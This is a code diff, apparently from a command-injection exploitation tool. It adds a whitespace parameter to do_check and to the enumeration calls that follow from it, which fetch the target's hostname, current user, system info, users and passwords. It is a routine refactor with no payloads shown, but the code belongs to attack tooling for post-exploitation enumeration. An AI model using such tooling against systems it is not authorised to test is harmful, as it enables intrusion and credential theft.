 """
 Check the defined options
 """
-def do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.ENUMERATION_DONE == False:
     print ""
   else:
     settings.ENUMERATION_DONE = False
 
   if menu.options.ps_version and settings.TARGET_OS == "win" and settings.PS_ENABLED == None:
-    powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     settings.ENUMERATION_DONE = True
 
   if menu.options.hostname:
     if settings.ENUMERATION_DONE == True:
       print ""
-    hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     settings.ENUMERATION_DONE = True
 
   if menu.options.current_user:
     if settings.ENUMERATION_DONE == True:
       print ""
-    current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.ENUMERATION_DONE == False:
       settings.ENUMERATION_DONE = True
 
   if menu.options.sys_info:
     if settings.ENUMERATION_DONE == True:
       print ""
-    system_information(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.ENUMERATION_DONE == False:
       settings.ENUMERATION_DONE = True
 
   if menu.options.users:
     if settings.ENUMERATION_DONE == True:
       print ""
-    system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.ENUMERATION_DONE == False:
       settings.ENUMERATION_DONE = True
 
   if menu.options.passwords:
     if settings.ENUMERATION_DONE == True:
       print ""
-    system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.ENUMERATION_DONE == False:
       settings.ENUMERATION_DONE = True
 
